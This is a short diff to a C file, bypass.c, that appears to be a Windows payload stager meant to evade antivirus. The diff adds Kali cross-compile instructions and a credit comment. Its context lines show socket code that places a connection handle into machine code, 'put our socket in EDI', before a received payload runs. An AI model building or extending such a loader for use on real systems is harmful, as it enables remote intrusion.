@@ -27,6 +27,13 @@
    OF SUCH DAMAGE.
 */
 
+/*
+To Compile on Kali (Thanks Zach)
+
+Install Build Environment: apt-get install wine mingw32 mingw32-binutils mingw32-runtime
+Compile:  i586-mingw32msvc-gcc bypass.c -lws2_32
+*/
+
 #include <windows.h>
 #include <winsock2.h>
 #include <stdio.h>
@@ -68,6 +75,7 @@ int main() {
   int rcvd = 0;         // Track how many bytes we have received. Should match size when done.
   
   // Add assembly to make put our socket in EDI
+  // Thanks @egyp7 for this fix.
   index[0] = 0xBF;
   memcpy(index + 1, &ConnectSocket, 4);
   index += 5;
